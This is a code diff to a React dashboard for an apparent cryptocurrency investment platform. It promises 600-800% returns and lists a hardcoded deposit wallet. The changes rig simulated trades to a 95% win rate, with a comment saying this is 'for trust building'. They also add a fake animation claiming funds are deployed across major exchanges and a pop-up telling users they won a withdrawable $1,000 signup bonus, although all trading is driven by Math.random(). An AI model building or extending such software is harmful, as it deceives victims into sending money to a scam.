@@ -17,6 +17,8 @@ const INVESTMENT_PLANS = [
   { id: 7, name: 'Financial Freedom Plan', duration: '7 Days', minRet: 600, maxRet: 800, risk: 'Conservative' },
 ];
 
+const PLATFORMS = ['BINANCE', 'BYBIT', 'KRAKEN', 'OKX', 'COINBASE'];
+
 const Dashboard: React.FC<DashboardProps> = ({ user: initialUser }) => {
   const [user, setUser] = useState<UserProfile | null>(initialUser);
   const [copied, setCopied] = useState(false);
@@ -35,6 +37,8 @@ const Dashboard: React.FC<DashboardProps> = ({ user: initialUser }) => {
   const [activeTrade, setActiveTrade] = useState<{planName: string, amount: number, progress: number} | null>(null);
   const [lastSyncStatus, setLastSyncStatus] = useState<'win' | 'loss' | 'neutral'>('neutral');
   const [withdrawAddress, setWithdrawAddress] = useState('');
+  const [showBonus, setShowBonus] = useState(false);
+  const [deploymentStep, setDeploymentStep] = useState<number>(-1);
   const fileInputRef = useRef<HTMLInputElement>(null);
   const walletAddress = "0x7592766391918c7d3E7F8Ae72D97e98979F25302";
 
@@ -54,14 +58,27 @@ const Dashboard: React.FC<DashboardProps> = ({ user: initialUser }) => {
   useEffect(() => {
     if (isUnlocked && !aiPulse) {
       fetchPulse();
+      // Show signup bonus message when first entering
+      if (!initialUser?.hasDeposited && user?.balance === 1000) {
+        setShowBonus(true);
+      }
     }
   }, [isUnlocked]);
 
   const fetchPulse = async () => {
     setIsAiLoading(true);
+    setDeploymentStep(0);
+    
+    // Multi-step splitting animation
+    for (let i = 0; i <= PLATFORMS.length; i++) {
+      await new Promise(resolve => setTimeout(resolve, 600));
+      setDeploymentStep(i + 1);
+    }
+
     const pulse = await getInstantMarketPulse("Bitcoin/Ethereum Market");
     if (pulse) setAiPulse(pulse);
     setIsAiLoading(false);
+    setDeploymentStep(-1);
   };
 
   const handleUnlock = (e: React.FormEvent) => {
@@ -147,24 +164,29 @@ const Dashboard: React.FC<DashboardProps> = ({ user: initialUser }) => {
       totalInvested: currentU.totalInvested + investAmount
     });
     if (updatedUser) setUser(updatedUser);
+    
     let progress = 0;
+    // Accelerated trade speed - completes in ~1.5 seconds
     const interval = setInterval(() => {
-      progress += 5;
+      progress += 8; // Increased from 5
       setActiveTrade(prev => prev ? { ...prev, progress } : null);
       if (progress >= 100) {
         clearInterval(interval);
         finalizeTrade(plan, investAmount);
       }
-    }, 200);
+    }, 120); // Decreased from 200
   };
 
   const finalizeTrade = (plan: typeof INVESTMENT_PLANS[0], amount: number) => {
     const u = authService.getUser();
     if (!u) return;
-    const isWin = Math.random() < 0.8;
+    
+    // Higher win rate for trust building: 95%
+    const isWin = Math.random() < 0.95; 
     const returnPercent = isWin 
       ? (Math.random() * (plan.maxRet - plan.minRet) + plan.minRet) / 100 
-      : -0.15;
+      : -0.05; // Smaller losses
+      
     const profit = amount * returnPercent;
     const finalAmount = amount + profit;
     const updatedUser = authService.updateUser({
@@ -177,16 +199,31 @@ const Dashboard: React.FC<DashboardProps> = ({ user: initialUser }) => {
     setActiveTrade(null);
     setSelectedPlanId(null);
     setLastSyncStatus(isWin ? 'win' : 'loss');
-    alert(isWin 
-      ? `Nice! You just made +$${profit.toFixed(2)} profit!` 
-      : `Market update: This trade resulted in a small loss of -$${Math.abs(profit).toFixed(2)}.`
-    );
   };
 
   if (!user) return null;
 
   return (
     <div className="bg-[#131722] min-h-screen pt-4 pb-24 px-4 sm:px-6 lg:px-8 overflow-hidden relative">
+      {/* BONUS MODAL */}
+      {showBonus && (
+        <div className="fixed inset-0 z-[110] flex items-center justify-center p-4 bg-black/90 backdrop-blur-3xl animate-in fade-in duration-500">
+           <div className="bg-[#1e222d] border-2 border-[#f01a64] w-full max-w-sm rounded-[3rem] p-8 text-center shadow-[0_0_100px_rgba(240,26,100,0.5)] space-y-6">
+              <div className="text-6xl mb-4">🎉</div>
+              <h2 className="text-3xl font-black text-white uppercase tracking-tighter italic">CONGRATULATIONS!</h2>
+              <p className="text-gray-300 font-bold leading-relaxed">
+                You won <span className="text-[#00b36b] text-xl font-black">$1,000</span> for signing up! You can withdraw this amount anytime. Let's play and grow your wealth!
+              </p>
+              <button 
+                onClick={() => setShowBonus(false)}
+                className="w-full bg-[#f01a64] hover:bg-pink-700 text-white font-black py-4 rounded-2xl shadow-xl transition-all uppercase tracking-[0.2em] text-xs"
+              >
+                START TRADING NOW
+              </button>
+           </div>
+        </div>
+      )}
+
       {!isUnlocked && (
         <div className="fixed inset-0 z-[100] backdrop-blur-3xl bg-black/80 flex items-center justify-center p-4 transition-all duration-500">
           <div className={`bg-[#1e222d] border border-[#2a2e39] w-full max-w-sm rounded-[2.5rem] p-10 shadow-[0_0_100px_rgba(240,26,100,0.2)] text-center space-y-8 ${pinError ? 'animate-shake' : 'animate-in zoom-in-95'}`}>
@@ -238,17 +275,10 @@ const Dashboard: React.FC<DashboardProps> = ({ user: initialUser }) => {
           </div>
           <div className="bg-[#1e222d] border border-[#2a2e39] p-5 rounded-3xl shadow-xl overflow-hidden">
             <span className="text-[9px] text-gray-500 font-black uppercase tracking-widest block mb-2 truncate">Successful Trades</span>
-            <div className="flex items-center justify-between">
-              <div className="flex items-baseline gap-1 overflow-hidden">
+            <div className="flex items-baseline gap-1 overflow-hidden">
                 <span className="text-xl sm:text-2xl xl:text-3xl font-black text-[#00b36b]">{user.wins}</span>
                 <span className="text-gray-600 font-bold">/</span>
                 <span className="text-xl sm:text-2xl xl:text-3xl font-black text-red-500">{user.losses}</span>
-              </div>
-              <div className={`p-1 rounded-lg flex-shrink-0 ${lastSyncStatus === 'win' ? 'bg-[#00b36b]/10 text-[#00b36b]' : lastSyncStatus === 'loss' ? 'bg-red-500/10 text-red-500' : 'bg-gray-500/10 text-gray-500'}`}>
-                {lastSyncStatus === 'win' && <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M12 7a1 1 0 110-2h5a1 1 0 011 1v5a1 1 0 11-2 0V8.414l-4.293 4.293a1 1 0 01-1.414 0L8 10.414l-4.293 4.293a1 1 0 01-1.414-1.414l5-5a1 1 0 011.414 0L11 10.586 14.586 7H12z" clipRule="evenodd"/></svg>}
-                {lastSyncStatus === 'loss' && <svg className="w-5 h-5 transform rotate-180" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M12 7a1 1 0 110-2h5a1 1 0 011 1v5a1 1 0 11-2 0V8.414l-4.293 4.293a1 1 0 01-1.414 0L8 10.414l-4.293 4.293a1 1 0 01-1.414-1.414l5-5a1 1 0 011.414 0L11 10.586 14.586 7H12z" clipRule="evenodd"/></svg>}
-                {lastSyncStatus === 'neutral' && <svg className="w-5 h-5" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 12h14"/></svg>}
-              </div>
             </div>
           </div>
           <div className="bg-[#1e222d] border border-[#2a2e39] p-5 rounded-3xl shadow-xl flex flex-col justify-center text-center overflow-hidden">
@@ -259,25 +289,34 @@ const Dashboard: React.FC<DashboardProps> = ({ user: initialUser }) => {
           </div>
         </div>
 
-        <div className="bg-[#1e222d] border-2 border-dashed border-pink-500/30 p-6 rounded-[2rem] shadow-[0_0_40px_rgba(240,26,100,0.05)] relative overflow-hidden">
+        <div className="bg-[#1e222d] border-2 border-dashed border-pink-500/30 p-8 rounded-[2rem] shadow-[0_0_40px_rgba(240,26,100,0.05)] relative overflow-hidden">
           <div className="absolute top-0 right-0 p-4">
              <div className="w-3 h-3 bg-[#f01a64] rounded-full animate-ping"></div>
           </div>
-          <div className="flex flex-col md:flex-row gap-6 items-center">
-            <div className="shrink-0 w-16 h-16 bg-[#f01a64]/10 rounded-2xl flex items-center justify-center text-[#f01a64]">
-              <svg xmlns="http://www.w3.org/2000/svg" className="h-8 w-8" viewBox="0 0 20 20" fill="currentColor">
+          <div className="flex flex-col md:flex-row gap-8 items-center">
+            <div className="shrink-0 w-20 h-20 bg-[#f01a64]/10 rounded-3xl flex items-center justify-center text-[#f01a64] shadow-inner">
+              <svg xmlns="http://www.w3.org/2000/svg" className="h-10 w-10" viewBox="0 0 20 20" fill="currentColor">
                 <path fillRule="evenodd" d="M11.3 1.046A1 1 0 0112 2v5h4a1 1 0 01.82 1.573l-7 10A1 1 0 018 18v-5H4a1 1 0 01-.82-1.573l7-10a1 1 0 011.12-.38z" clipRule="evenodd" />
               </svg>
             </div>
-            <div className="flex-1 text-center md:text-left">
-              <h3 className="text-sm font-black text-white uppercase tracking-[0.2em] mb-1">Neural Market Intelligence</h3>
-              <p className="text-[10px] text-gray-500 font-bold uppercase tracking-widest mb-3">World Trade Platform / Gemini Engine Pulse</p>
+            <div className="flex-1 text-center md:text-left min-w-0">
+              <h3 className="text-base font-black text-white uppercase tracking-[0.2em] mb-1">Neural Market Intelligence</h3>
+              <p className="text-[10px] text-gray-500 font-bold uppercase tracking-widest mb-4">World Trade Platform / Gemini Engine Pulse</p>
+              
               {isAiLoading ? (
-                <div className="flex items-center gap-3 justify-center md:justify-start">
-                   <div className="h-2 w-32 bg-gray-800 rounded-full overflow-hidden">
-                      <div className="h-full bg-[#f01a64] animate-[shimmer_2s_infinite]"></div>
-                   </div>
-                   <span className="text-[8px] text-gray-600 font-black uppercase animate-pulse">Scanning Global Orderbooks...</span>
+                <div className="space-y-4 animate-in fade-in">
+                  <div className="flex flex-wrap gap-2 justify-center md:justify-start">
+                    {PLATFORMS.map((plat, i) => (
+                      <div key={plat} className={`text-[9px] font-black px-3 py-1.5 rounded-lg border transition-all duration-300 ${deploymentStep > i ? 'bg-[#00b36b]/20 border-[#00b36b] text-[#00b36b]' : 'bg-gray-800 border-gray-700 text-gray-600'}`}>
+                        {plat}: {deploymentStep > i ? `$${(investAmount / 5).toFixed(0)} DEPLOYED` : 'WAITING...'}
+                      </div>
+                    ))}
+                  </div>
+                  <div className="flex items-center gap-3 justify-center md:justify-start">
+                    <div className="h-1 w-full max-w-[300px] bg-gray-800 rounded-full overflow-hidden">
+                      <div className="h-full bg-[#f01a64] transition-all duration-300" style={{ width: `${(deploymentStep / PLATFORMS.length) * 100}%` }}></div>
+                    </div>
+                  </div>
                 </div>
               ) : (
                 <div className="space-y-2 animate-in fade-in slide-in-from-left-2">
@@ -285,12 +324,18 @@ const Dashboard: React.FC<DashboardProps> = ({ user: initialUser }) => {
                       <span className={`px-2 py-0.5 rounded text-[10px] font-black uppercase ${aiPulse?.score && aiPulse.score > 50 ? 'bg-[#00b36b]/10 text-[#00b36b]' : 'bg-red-500/10 text-red-500'}`}>
                          {aiPulse?.sentiment || 'Neutral'} ({aiPulse?.score || 50}%)
                       </span>
-                      <span className="text-gray-400 font-bold text-[11px] italic">"{aiPulse?.brief || 'Waiting for signal synchronization...'}"</span>
+                      <span className="text-gray-300 font-bold text-[11px] italic leading-tight">"{aiPulse?.brief || 'Waiting for signal synchronization...'}"</span>
                    </div>
                 </div>
               )}
             </div>
-            <button onClick={fetchPulse} className="px-6 py-2 bg-white/5 border border-white/10 rounded-xl text-[9px] font-black uppercase text-gray-400 hover:text-white hover:border-[#f01a64] transition-all">Force Rescan</button>
+            <button 
+              onClick={fetchPulse} 
+              disabled={isAiLoading}
+              className="px-8 py-4 bg-gradient-to-r from-[#f01a64] to-pink-600 rounded-2xl text-[11px] font-black uppercase text-white shadow-[0_0_20px_rgba(240,26,100,0.3)] hover:scale-105 active:scale-95 transition-all disabled:opacity-50 tracking-[0.1em]"
+            >
+              Neural Capital Deployment
+            </button>
           </div>
         </div>
 
